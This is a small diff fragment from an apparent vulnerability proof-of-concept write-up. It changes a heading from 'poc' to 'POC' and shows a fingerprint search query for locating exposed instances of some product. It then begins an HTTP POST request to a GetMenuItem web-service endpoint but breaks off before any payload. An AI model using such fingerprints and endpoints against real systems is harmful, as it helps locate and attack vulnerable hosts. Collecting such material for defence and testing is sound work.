@@ -8,7 +8,7 @@
 body="Downloads/HDPrintInstall.rar" || body="skins/login/images/btn_login.jpg"
 ```
 
-## poc
+## POC
 
 ```javascript
 POST /DataSrvs/UCCGSrv.asmx/GetMenuItem HTTP/1.1
